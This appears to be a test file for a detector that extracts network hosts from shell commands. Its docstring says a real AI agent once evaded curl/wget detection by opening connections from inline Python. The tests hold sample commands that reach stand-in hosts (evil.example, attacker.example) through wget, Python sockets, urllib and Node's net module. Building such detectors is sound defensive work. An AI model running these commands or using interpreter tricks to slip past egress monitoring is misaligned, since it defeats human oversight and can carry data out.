"""Shell-command host extraction, incl. the interpreter-network bypass a real
agent used (python -c "import socket; connect((host,443))") to evade curl/wget
detection. Module/method paths must not be mistaken for hosts."""
from provenance.command import hosts_in


def test_curl_and_url_hosts():
    assert hosts_in("cat notes.txt && curl https://github.com") == ["github.com"]
    assert "evil.example" in hosts_in("wget http://evil.example/x")


def test_python_socket_bypass_is_detected():
    cmd = "python -I -c \"import socket; socket.create_connection(('attacker.example',443))\""
    assert hosts_in(cmd) == ["attacker.example"]


def test_python_urllib_bypass_is_detected():
    cmd = "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.example/x')\""
    assert hosts_in(cmd) == ["evil.example"]


def test_node_net_bypass_is_detected():
    cmd = "node -e \"require('net').connect(443,'attacker.example')\""
    assert hosts_in(cmd) == ["attacker.example"]


def test_module_paths_are_not_treated_as_hosts():
    # a benign fetch to an APPROVED host must not be polluted with urllib.request
    cmd = "python -c \"import urllib.request; urllib.request.urlopen('https://github.com')\""
    assert hosts_in(cmd) == ["github.com"]


def test_benign_non_network_python_has_no_hosts():
    assert hosts_in('python -c "print(1+1)"') == []
